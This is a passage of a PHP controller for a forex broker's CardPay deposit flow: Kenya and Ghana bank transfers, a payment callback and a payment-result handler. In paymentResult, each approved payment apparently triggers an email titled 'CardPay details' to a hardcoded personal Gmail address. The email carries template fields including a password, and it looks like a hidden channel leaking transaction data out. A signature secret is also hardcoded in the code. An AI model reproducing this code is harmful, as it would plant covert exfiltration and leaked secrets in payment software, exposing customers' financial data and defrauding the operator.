                $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

                if ($this->form_validation->run() && !$data['error_msg']) {
                    // $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
                    $user_id = $this->session->userdata('user_id');
                    $account_number = $this->session->userdata('account_number');
                    $email = $this->session->userdata('email');
                    $full_name = $this->session->userdata('full_name');
                    $bonus = $this->input->get('bonus', true);
                    $amount = ceil($this->input->post('amount', true));
                    $this->load->library('CardPay');
                    $this->cardpay->setAccessType(0);
                    $test_users = unserialize(TEST_USERS_DEPOSIT);
                    if (in_array($user_id, $test_users)) {
                        $this->cardpay->setAccessType(0); // 0 - test 1 -live
                    } else {
                        $this->cardpay->setAccessType(1); // 0 - test 1 -live
                    }

                    //$currency = $this->input->post('currency', true);
                    $method = $this->input->post('methods', true);
                    if (strpos($method, 'BANKCARD') !== false) {
                        $method = 'BANKCARD';
                    }

                    $this->cardpay->setCurrency($data['currency']);
                    $this->cardpay->setMethod($method);
                    $this->cardpay->setUrl('auth_token');
                    $authRes = $this->cardpay->requestAuthToken();
                    $this->cardpay->setToken($authRes['access_token']);

                    $requestDate = date('Y-m-d\TH:i:s\Z', strtotime(FXPP::getCurrentDateTime())); //"2018-08-28T09:09:49Z"
                    $description = 'Deposit BANK KES ['.$account_number.']';
                    $date = new DateTime();
                    $requestId = $date->getTimestamp();

                    $orderId = 'kes'.uniqid();

                    $insert_data = [
                    'amount' => $amount,
                    'request_id' => $requestId,
                    'order_id       ' => $orderId,
                    'payment_method' => $method,
                    'payment_currency' => $data['currency'],
                    'bonus' => $bonus,
                    'create_date' => date('Y-m-d h:i:s'),
                    'user_id' => $user_id,
                ];

                    $this->general_model->insertmy('cardpay', $insert_data);

                    $paymentParams = [
                    'request' => [
                        'id' => $requestId,
                        'time' => $requestDate,
                    ],
                    'merchant_order' => [
                        'id' => $orderId,
                        'description' => $description,
                    ],
                    'payment_method' => $method,
                    'payment_data' => [
                        'amount' => $amount,
                        'currency' => $data['currency'],
                    ],
                    'customer' => [
                        'email' => $email,
                        'full_name' => $full_name,
                        'id' => $user_id,
                    ],
                    'return_urls' => [
                        'cancel_url' => 'https://my.forexmart.com/deposit/bank_transfer_kes?status=3',
                        'decline_url' => 'https://my.forexmart.com/deposit/bank_transfer_kes?status=0',
                        'inprocess_url' => 'https://my.forexmart.com/deposit/bank_transfer_kes?status=1',
                        'success_url' => 'https://my.forexmart.com/deposit/bank_transfer_kes?status=2',
                    ],
                ];

                    $this->cardpay->setUrl('payment');
                    $paymentRes = $this->cardpay->requestPayment($paymentParams);
                    if (isset($paymentRes['redirect_url'])) {
                        redirect($paymentRes['redirect_url']); //redirect to the payment gateway page.
                    } else {
                        $message = $paymentRes['message'];

                        $this->session->set_flashdata('cardpay_transaction', $message);
                        redirect(FXPP::loc_url('deposit/bank_transfer_kes?status=4'));
                    }
                }

                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //    $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account_currency'] = $account['currency'];
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status == '0') {
                    $data['msg'] = 'Transaction declined.';
                } elseif ($status == '1') {
                    $data['msg'] = 'Transaction in-process.';
                } elseif ($status == '2') {
                    $data['msg'] = 'Transaction successful.';
                } elseif ($status == '3') {
                    $data['msg'] = 'Transaction cancelled.';
                } elseif ($status == '4') {
                    $data['msg'] = 'Transaction failed.';
                } else {
                    $data['msg'] = '';
                }
                if (!empty(form_error('amount'))) {
                    $data['msg'] = '';
                }

                $data['metadata_description'] = 'CardPay';
                $this->template->title('ForexMart | Deposit - Banks of Kenya')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/cardpay_v2', $data);
            } else {
                redirect(FXPP::loc_url('deposit'));
            }
        } else {
            redirect('signout');
        }
    }

    public function bank_transfer_ghs()
    {//ghana
        if ($this->session->userdata('logged')) {
            redirect(FXPP::loc_url('deposit'));
            if (FXPP::isGhanaCountry() || IPLoc::Office()) {
                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                $data['currency'] = $currency = 'GHS';

                //if ($data['amount'] == null) {
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|non_usd_min_amt_validate[$currency]");

                $this->form_validation->set_rules('methods', 'Methods', 'trim|required|xss_clean');

                //}

                if ($this->form_validation->run()) {
                    // $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
                    $user_id = $this->session->userdata('user_id');
                    $account_number = $this->session->userdata('account_number');
                    $email = $this->session->userdata('email');
                    $full_name = $this->session->userdata('full_name');
                    $bonus = $this->input->get('bonus', true);
                    $amount = ceil($this->input->post('amount', true));
                    $this->load->library('CardPay');
                    $this->cardpay->setAccessType(0);
                    $test_users = unserialize(TEST_USERS_DEPOSIT);
                    if (in_array($user_id, $test_users)) {
                        $this->cardpay->setAccessType(0); // 0 - test 1 -live
                    } else {
                        $this->cardpay->setAccessType(1); // 0 - test 1 -live
                    }

                    //$currency = $this->input->post('currency', true);
                    $method = $this->input->post('methods', true);
                    if (strpos($method, 'BANKCARD') !== false) {
                        $method = 'BANKCARD';
                    }

                    $this->cardpay->setCurrency($data['currency']);
                    $this->cardpay->setMethod($method);
                    $this->cardpay->setUrl('auth_token');
                    $authRes = $this->cardpay->requestAuthToken();
                    $this->cardpay->setToken($authRes['access_token']);

                    $requestDate = date('Y-m-d\TH:i:s\Z', strtotime(FXPP::getCurrentDateTime())); //"2018-08-28T09:09:49Z"
                    $description = 'Deposit BANK GHS ['.$account_number.']';
                    $date = new DateTime();
                    $requestId = $date->getTimestamp();

                    $orderId = 'ghs'.uniqid();

                    $insert_data = [
                    'amount' => $amount,
                    'request_id' => $requestId,
                    'order_id       ' => $orderId,
                    'payment_method' => $method,
                    'payment_currency' => $data['currency'],
                    'bonus' => $bonus,
                    'create_date' => date('Y-m-d h:i:s'),
                    'user_id' => $user_id,
                ];

                    $this->general_model->insertmy('cardpay', $insert_data);

                    $paymentParams = [
                    'request' => [
                        'id' => $requestId,
                        'time' => $requestDate,
                    ],
                    'merchant_order' => [
                        'id' => $orderId,
                        'description' => $description,
                    ],
                    'payment_method' => $method,
                    'payment_data' => [
                        'amount' => $amount,
                        'currency' => $data['currency'],
                    ],
                    'customer' => [
                        'email' => $email,
                        'full_name' => $full_name,
                        'id' => $user_id,
                    ],
                    'return_urls' => [
                        'cancel_url' => 'https://my.forexmart.com/deposit/bank_transfer_ghs?status=3',
                        'decline_url' => 'https://my.forexmart.com/deposit/bank_transfer_ghs?status=0',
                        'inprocess_url' => 'https://my.forexmart.com/deposit/bank_transfer_ghs?status=1',
                        'success_url' => 'https://my.forexmart.com/deposit/bank_transfer_ghs?status=2',
                    ],
                ];

                    $this->cardpay->setUrl('payment');
                    $paymentRes = $this->cardpay->requestPayment($paymentParams);
                    if (isset($paymentRes['redirect_url'])) {
                        redirect($paymentRes['redirect_url']); //redirect to the payment gateway page.
                    } else {
                        $message = $paymentRes['message'];

                        $this->session->set_flashdata('cardpay_transaction', $message);
                        redirect(FXPP::loc_url('deposit/bank_transfer_ghs?status=4'));
                    }
                }

                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //    $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account_currency'] = $account['currency'];
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status == '0') {
                    $data['msg'] = 'Transaction declined.';
                } elseif ($status == '1') {
                    $data['msg'] = 'Transaction in-process.';
                } elseif ($status == '2') {
                    $data['msg'] = 'Transaction successful.';
                } elseif ($status == '3') {
                    $data['msg'] = 'Transaction cancelled.';
                } elseif ($status == '4') {
                    $data['msg'] = 'Transaction failed.';
                } else {
                    $data['msg'] = '';
                }
                if (!empty(form_error('amount'))) {
                    $data['msg'] = '';
                }
                $data['metadata_description'] = 'CardPay';
                $this->template->title('ForexMart | Deposit - Banks of Ghana')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/cardpay_v2', $data);
            } else {
                redirect(FXPP::loc_url('deposit'));
            }
        } else {
            redirect('signout');
        }
    }

    public function cardpay()
    {
        show_404('accessing');
        if ($this->session->userdata('logged')) {
            $data['amount'] = $this->input->post_get('amount1', true);
            $data['bounusfiled'] = $this->input->get('bonus', true);
            $data['currency'] = 'MXN';

            //if ($data['amount'] == null) {
            $this->form_validation->set_rules('amount', 'Amount', 'trim|required|xss_clean');

            $this->form_validation->set_rules('methods', 'Methods', 'trim|required|xss_clean');

            //}

            if ($this->form_validation->run()) {
                // $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
                $user_id = $this->session->userdata('user_id');
                $account_number = $this->session->userdata('account_number');
                $email = $this->session->userdata('email');
                $full_name = $this->session->userdata('full_name');
                $bonus = $this->input->get('bonus', true);
                $amount = ceil($this->input->post('amount', true));
                $this->load->library('CardPay');
                $this->cardpay->setAccessType(0);
                $test_users = unserialize(TEST_USERS_DEPOSIT);
                if (in_array($user_id, $test_users)) {
                    $this->cardpay->setAccessType(0); // 0 - test 1 -live
                } else {
                    $this->cardpay->setAccessType(1); // 0 - test 1 -live
                }

                $currency = $this->input->post('currency', true);
                $method = $this->input->post('methods', true);
                if (strpos($method, 'BANKCARD') !== false) {
                    $method = 'BANKCARD';
                }

                $this->cardpay->setCurrency($currency);
                $this->cardpay->setMethod($method);
                $this->cardpay->setUrl('auth_token');
                $authRes = $this->cardpay->requestAuthToken();
                $this->cardpay->setToken($authRes['access_token']);

                $requestDate = date('Y-m-d\TH:i:s\Z', strtotime(FXPP::getCurrentDateTime())); //"2018-08-28T09:09:49Z"
                $description = 'Deposit CardPay ['.$account_number.']';
                $date = new DateTime();
                $requestId = $date->getTimestamp();

                $orderId = 'cp'.uniqid();

                $insert_data = [
                    'amount' => $amount,
                    'request_id' => $requestId,
                    'order_id       ' => $orderId,
                    'payment_method' => $method,
                    'payment_currency' => $currency,
                    'bonus' => $bonus,
                    'create_date' => date('Y-m-d h:i:s'),
                    'user_id' => $user_id,
                ];

                $this->general_model->insertmy('cardpay', $insert_data);

                $paymentParams = [
                    'request' => [
                        'id' => $requestId,
                        'time' => $requestDate,
                    ],
                    'merchant_order' => [
                        'id' => $orderId,
                        'description' => $description,
                    ],
                    'payment_method' => $method,
                    'payment_data' => [
                        'amount' => $amount,
                        'currency' => $currency,
                    ],
                    'customer' => [
                        'email' => $email,
                        'full_name' => $full_name,
                        'id' => $user_id,
                    ],
                ];

                $this->cardpay->setUrl('payment');
                $paymentRes = $this->cardpay->requestPayment($paymentParams);
                if (isset($paymentRes['redirect_url'])) {
                    redirect($paymentRes['redirect_url']); //redirect to the payment gateway page.
                } else {
                    $message = $paymentRes['message'];

                    $this->session->set_flashdata('cardpay_transaction', $message);
                    redirect(FXPP::loc_url('deposit/cardpay'));
                }
            }

            $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
            //    $data['user_status'] = $user_status;
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));

            $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

            $data['metadata_description'] = 'CardPay';
            $this->template->title('ForexMart | Deposit - CardPay')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/cardpay_v2', $data);
        } else {
            redirect('signout');
        }
    }

    public function requestPaymentMethods()
    {
        $currency = $this->input->post('currency', true);
        $this->load->library('CardPay');

        $methodList = $this->cardpay->getMethodList($currency);
        $selectOption = '';
        foreach ($methodList as $key => $value) {
            $selectOption = $selectOption."<option value='".$key."'>".$value.'</option>';
        }
        $this->output->set_content_type('application/json')->set_output(json_encode(['option' => $selectOption]));
    }

    /*
     * Cancel Payment in CardPay
     */
    public function cardpay_cancel()
    {
        $this->session->set_flashdata('cardpay_transaction', 'Transaction has been cancelled.');
        redirect(FXPP::loc_url('deposit/cardpay'));
    }

    /*
     * Success Payment in CardPay
     */
    public function cardpay_success()
    {
        $this->session->set_flashdata('cardpay_transaction', 'Transaction successfull.');
        redirect(FXPP::loc_url('deposit/cardpay'));
    }

    /*
     * decline Payment in CardPay
     */
    public function cardpay_decline()
    {
        $this->session->set_flashdata('cardpay_transaction', 'Transaction has been declined.');
        redirect(FXPP::loc_url('deposit/cardpay'));
    }

    /*
     * In-process Payment in CardPay
     */
    public function cardpay_inprocess()
    {
        $this->session->set_flashdata('cardpay_transaction', 'Transaction In Process.');
        redirect(FXPP::loc_url('deposit/cardpay'));
    }

    /*
     * Card Pay Instant Payment Notification URL
     */

    public function cardpay_callback()
    {
        $insertData = ['log' => serialize($_REQUEST), 'ip' => $this->input->ip_address(), 'type' => 'CARDPAY'];
        $this->general_model->insertmy('fasapay_log', $insertData);

        $cardpayOrderXML = $_REQUEST['orderXML'];
        $orderXML = base64_decode($cardpayOrderXML);
        $orderXMLObj = simplexml_load_string($orderXML);
        $cardpaySha512 = $_REQUEST['sha512'];

        $condition = [  // check if tnx id exist in cardpay table
            'order_id' => $orderXMLObj['number'],
            'status' => 1, // processed
        ];

        if ($this->general_model->whereCondition('cardpay', $condition)) {
            return false;
        }

        if ($row = $this->general_model->where('cardpay', ['order_id' => $orderXMLObj['number'], 'status' => 0])) {
            $invData = $row->row_array();
            $this->load->library('CardPay');
            $test_users = unserialize(TEST_USERS_DEPOSIT);
            if (in_array($orderXMLObj['customer_id'], $test_users)) {
                $this->cardpay->setAccessType(0); // 0 - test 1 -live
            } else {
                $this->cardpay->setAccessType(1); // 0 - test 1 -live
            }

            $paymentType = strtoupper('BANK_'.$invData['payment_currency']);

            $this->cardpay->setCurrency($invData['payment_currency']);
            $this->cardpay->setMethod($invData['payment_method']);
            $credentials = $this->cardpay->getWalletCredentials();
            $status = $this->card_pay_status[strtolower($orderXMLObj['status'])];
            $genSha512 = hash('sha512', $orderXML.$credentials['terminal_password']);
            if ($genSha512 == $cardpaySha512) { // validate
                if ($status == 2) {// accept approve status only
                   // if (floatval($invData['amount']) == floatval($orderXMLObj['amount'])) {
                        $paidAmount = ($orderXMLObj['amount']);

                    $updateData = ['status' => 1]; // update the status in  cardpay table
                    $this->general_model->updatemy('cardpay', 'order_id', $orderXMLObj['number'], $updateData);

                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    switch ($orderXMLObj['currency']) {
                                case 'MXN':
                                    $total_amount = FXPP::roundno($this->get_convert_amount($orderXMLObj['currency'], $paidAmount, $accData['currency']), 2); //amount in account currency
                                    break;
                                default:
                                    $total_amount = FXPP::roundno(FXPP::freeCurrencyConverter($orderXMLObj['currency'], $accData['currency'], $paidAmount), 2); //amount in account currency
                                    break;
                            }

                    $amount = $total_amount; //amount in account currency

                    // Fee computation
                    $this->cardpay->setAccountCurrency($accData['currency']);
                    $this->cardpay->setAmount($amount);
                    $totalFee = $this->cardpay->getTotalTransactionFee();

                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($isMicro) {
                        $amount *= 100;
                        $totalFee *= 100;
                        $total_amount *= 100;
                        // $currencyStatus = $this->currency_status['Cents'];
                    }

                    if ($amount > $totalFee) { // allow deduction only if amount is greater than the fee
                        $amount -= $totalFee;
                    } else {
                        $totalFee = 0;
                    }

                    $conv_amount = $amount;
                    $conv_amount_fee = $totalFee;
                    $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);
                    $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $totalFee);

                    $insertDepositFailed = [
                                'transaction_id	' => $orderXMLObj['id'],
                                'status	' => 0,
                                'amount	' => $amount,
                                'currency' => $orderXMLObj['currency'],
                                'user_id' => $invData['user_id'],
                                'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                                'transaction_type' => $paymentType,
                                'fee' => $totalFee,
                                'isFailed' => 0,
                                'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                            ];

                    $data = [
                                'transaction_id' => $orderXMLObj['id'],
                                'reference_id' => $orderXMLObj['number'],
                                'status' => 2,
                                'amount' => $amount,
                                'currency' => $orderXMLObj['currency'],
                                'user_id' => $orderXMLObj['customer_id'],
                                'payment_date' => date('Y-m-d H:i:s', strtotime($orderXMLObj['date'])),
                                'note' => $paymentType.' deposit',
                                'transaction_type' => $paymentType,
                                'conv_amount' => $conv_amount_fee,
                            ];

                    if ($totalFee > 0) {
                        $data_fee = [
                                    'transaction_id' => $orderXMLObj['id'],
                                    'reference_id' => $orderXMLObj['number'],
                                    'status' => 2,
                                    'amount' => $totalFee,
                                    'currency' => $orderXMLObj['currency'],
                                    'user_id' => $invData['user_id'],
                                    'payment_date' => date('Y-m-d H:i:s', strtotime($orderXMLObj['date'])),
                                    'note' => $paymentType.' deposit',
                                    'transaction_type' => $paymentType,
                                    'conv_amount' => $conv_amount,
                                ];
                    }

                    $config = [
                                'server' => 'live_new',
                            ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

                    //if(IPLoc::APIUpgradeDevIP()){
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type[$paymentType].$orderXMLObj['id']);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];
                    /* }else{
                         $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'] . $this->comment_transaction_type[$paymentType] . $orderXMLObj['id']);
                         $requestResult = $WebService->request_status;
                         $ticket        = $WebService->get_result('Ticket');
                     }*/

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                    // Back Agent of Client
                                //FXPP::BackAgentOfAccount($account_number); // for NDB
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }

                    if ($totalFee > 0) {
//                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

                        // if(IPLoc::APIUpgradeDevIP()){
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type[$paymentType].$orderXMLObj['id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
                        /* }else{
                             $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'] . $this->comment_transaction_type[$paymentType] . $orderXMLObj['id']);
                             $requestResult = $WebService->request_status;
                             $ticket        = $WebService->get_result('Ticket');
                         }*/

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($totalFee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

                    $updateData = ['status' => 1, 'tnx_id' => $orderXMLObj['id']];
                    $this->general_model->updatemy('cardpay', 'order_id', $orderXMLObj['number'], $updateData);

                    /* if (IPLoc::APIUpgradeDevIP()) {
                         FXPP::updateAccountTradingStatusV2($account_number, $invData['user_id']); // for pro accounts
                     } else {*/
                    FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    // }

                    /* ========================================== Welcome bonus================================================ **/

//                            if ($invData['additional_tenp_bonus'] == 1) {
//
//                                // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                                FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, $paymentType, 'tenpb', $data['transaction_id']);
//                            }

//                    if ($invData['bonus'] == 'twpb') {
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, $paymentType, 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'tpb') {
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, $paymentType, 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bonus'] == 'fpb') {
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, $paymentType, 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'hpb') {
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, $paymentType, 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bonus'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, $paymentType, 'rhpb', $data['transaction_id']);
//                        }
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, $paymentType, $invData['bonus'], $data['transaction_id'], false);

                    /* $bonuses = FXPP::getAccountBonusByType($account_number);
                     $qiwi_amount = $paidAmount;
                     $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                     if ($RequestLogintype['login_type'] != 1) {
                         if ($qiwi_amount > 0 AND $bonuses[2] > 0) {
                             FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                         }
                     }


                     $ndbProfitLogs = array(
                         'Account_number' => $account_number,
                         'DepAmount'      => $paidAmount,
                         'UserId'         => $invData['user_id'],
                         'TransactionId'  => $data['transaction_id'],
                         'ndbbonus'       => $bonuses[2]

                     );
                     $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                     $insertProfitLogs = array(
                         'logs'    => $encodeNdbProfitLogs,
                         'User_Id' => $invData['user_id']
                     );

                     $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);*/

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/
                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit($paymentType, $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type[$paymentType].$data['transaction_id']);
                /* End **/

                        //}
                } elseif ($status == 1) { // pending
                     $updateData = ['status' => 0, 'tnx_id' => $orderXMLObj['id'], 'note' => 'PENDING STATUS - '.$status];
                    $this->general_model->updatemy('cardpay', 'order_id', $orderXMLObj['number'], $updateData);
                } else { // declined
                    $updateData = ['status' => 2, 'tnx_id' => $orderXMLObj['id'], 'note' => 'DECLINED status - '.$status];
                    $this->general_model->updatemy('cardpay', 'order_id', $orderXMLObj['number'], $updateData);
                }
            } else {
                $updateData = ['status' => 2, 'tnx_id' => $orderXMLObj['id'], 'note' => 'sha512 do not match.'];
                $this->general_model->updatemy('cardpay', 'order_id', $orderXMLObj['number'], $updateData);
            }
        }
    }

    public function paymentResult()
    {
        $cardpayOrderXML = $_REQUEST['orderXML'];
        $orderXML = base64_decode($cardpayOrderXML);
        $orderXMLObj = simplexml_load_string($orderXML);
        $cardpaySha512 = $_REQUEST['sha512'];
        $test_users = unserialize(TEST_USERS_DEPOSIT);
        if (in_array($orderXMLObj['customer_id'], $test_users)) {
            $genSha512 = hash('sha512', $orderXML.'9XKHl3nNp74t');
        } else {
            $genSha512 = hash('sha512', $orderXML.$this->cardpay_secret_key);
        }
        if ($genSha512 == $cardpaySha512) {
            $decrypt_fields = FXPP::decrypt_data($orderXMLObj['note'], $this->encrypt_key);
            $custom_fields = [];
            $fields = explode(';', $decrypt_fields);
            foreach ($fields as $element) {
                $attributes = explode('=', $element);
                if (count($attributes) > 1) {
                    $custom_fields[$attributes[0]] = $attributes[1];
                }
            }

            $date = new DateTime();
            $order_number = $date->getTimestamp();

            $status = $this->card_pay_status[strtolower($orderXMLObj['status'])];
            $currency = strtoupper(trim($orderXMLObj['currency']));

            /* FXPP-6333 */
            $currencyStatus = $this->currency_status[$currency];
            $isMicro = $this->account_model->isMicro($orderXMLObj['customer_id']);
            if ($isMicro) {
                $orderXMLObj['amount'] *= 100;
                $currencyStatus = $this->currency_status['Cents'];
            }
            /* FXPP-6333 */

            $amount = $orderXMLObj['amount'];
            $conv_amount = $this->get_convert_amount($currency, $amount);

            $data = [
                'transaction_id' => $orderXMLObj['id'],
                'reference_id' => $orderXMLObj['number'],
                'status' => $status,
                'amount' => $orderXMLObj['amount'],
                'currency' => $orderXMLObj['currency'],
                'user_id' => $orderXMLObj['customer_id'],
                'payment_date' => date('Y-m-d H:i:s', strtotime($orderXMLObj['date'])),
                'note' => $orderXMLObj['note'],
                'transaction_type' => 'CARDPAY',
                'conv_amount' => $conv_amount,
                'payment_status' => $this->paymentType_status['Deposit via Debit/Credit (CardPay)'], //FXPP-7618
                'currency_status' => $currencyStatus, //FXPP-7618
            ];
            //if($data['user_id'] == 57574){

//            if(IPLoc::VPN_IP_Jenalie() || IPLoc::frzPM()){
//                if ($custom_fields['additional_bonus']) {
//                    $data['tenpercentbonus'] = 1;
//                }
//            }

            if ($custom_fields['additional_bonus'] == 1) {
                $data['tenpercentbonus'] = 1;
            }

            if ($custom_fields['bonus'] == 'twpb') {
                $data['twentypercentbonus'] = 1;
            }

            if ($custom_fields['bonus'] == 'twpb') {
                $data['twentypercentbonus'] = 1;
            }

            if ($custom_fields['bonus'] == 'tpb') {
                $data['thirtypercentbonus'] = 1;
            }
            if ($custom_fields['bonus'] == 'fpb') {
                $data['fiftypercentbonus'] = 1;
            }
            if ($custom_fields['bonus'] == 'hpb') {
                $data['hundredpercentbonus'] = 1;
            }
            // if ($custom_fields['bonus'] == 'rhpb') {
            //     $data['hundred_percent_constant_bonus'] = 1;
            // }
            //}

            $fee_data = [
                'transaction_id' => $orderXMLObj['id'],
                'reference_id' => $orderXMLObj['number'],
                'status' => $status,
                'amount' => $orderXMLObj['amount'],
                'currency' => $orderXMLObj['currency'],
                'user_id' => $orderXMLObj['customer_id'],
                'payment_date' => date('Y-m-d H:i:s', strtotime($orderXMLObj['date'])),
                'note' => $orderXMLObj['note'],
                'transaction_type' => 'CARDPAY',
            ];

            /*Duplicate validation check*/

            $condition = [
                'transaction_id' => $orderXMLObj['id'],
                'reference_id' => $orderXMLObj['number'],
                'user_id' => $orderXMLObj['customer_id'],
                'transaction_type' => 'CARDPAY',
            ];

            if ($this->general_model->whereCondition('deposit_queue', $condition)) {
                $insertData = ['log' => serialize($fee_data), 'ip' => $this->input->ip_address(), 'type' => 'CARDPAY'];
                $this->general_model->insertmy('fasapay_log', $insertData);

                return false;
            }

            /*End Duplicate validation check*/

//            if($data['user_id'] == 10293){
            if ($status == 2) {
                if (!$this->deposit_model->insertPaymentQueue($data)) {
                    $asset_user_docs=$this->config->item('asset_user_docs');
                    file_put_contents($asset_user_docs.'cardpay.log', $orderXML.PHP_EOL, FILE_APPEND);
                } else {
                    $payment_queue = $this->deposit_model->getPaymentQuequeByTranType('CARDPAY');

                    $email_response = '';
                    foreach ($orderXMLObj as $xmlKey => $xmlValue) {
                        $email_response .= $xmlKey.' = '.$xmlValue.'<br/>';
                    }
                    $email_data = [
                        'full_name' => 'moniruzzaman',
                        'email' => 'vela.nightclad@gmail.com',
                        'password' => '14563333',
                        'account_number' => $response.'<br/>fp!',
                    ];
                    $subject = 'CardPay details';
                    $config = [
                        'mailtype' => 'html',
                    ];

                    $this->general_model->sendEmail('welcome-html', $subject, $email_data['email'], $email_data, $config);

                    if (count($payment_queue) > 0) {
                        foreach ($payment_queue as $key => $payment) {
                            if (!$this->deposit_model->checkTransactionExist($payment['transaction_id'], 'CARDPAY')) {
                                if ($custom_fields['login_type'] == 1) {
                                    $account_detail = $this->partners_model->getAccountByUserId($payment['user_id']);
                                    $account_detail['account_number'] = $account_detail['reference_num'];
                                } else {
                                    $account_detail = $this->account_model->getAccountByUserId($payment['user_id']);
                                }

                                $fee = 0;
                                $conv_amount_fee = 0;
                                $amount = $payment['amount'];
                                $conv_amount = $payment['conv_amount'];
                                if (in_array($payment['currency'], ['EUR', 'USD'])) {
                                    if ($conv_amount > 0.25) {
                                        if ($payment['currency'] == 'EUR') {
                                            $fee = $this->get_convert_amount($payment['currency'], 0.25);
                                        } else {
                                            $fee = 0.25;
                                        }
                                        $conv_amount_fee = 0.25;

                                        $isMicro = $this->account_model->isMicro($payment['user_id']);
                                        if ($isMicro) {
                                            $fee *= 100;
                                            $conv_amount_fee *= 100;
                                        }

                                        $amount -= $fee;
                                        $conv_amount -= $conv_amount_fee;
                                    }
                                }

                                $insertDepositFailed = [
                                    'transaction_id	' => $payment['transaction_id'],
                                    'status	' => $payment['status'],
                                    'amount	' => $payment['amount'],
                                    'currency' => $payment['currency'],
                                    'user_id' => $payment['user_id'],
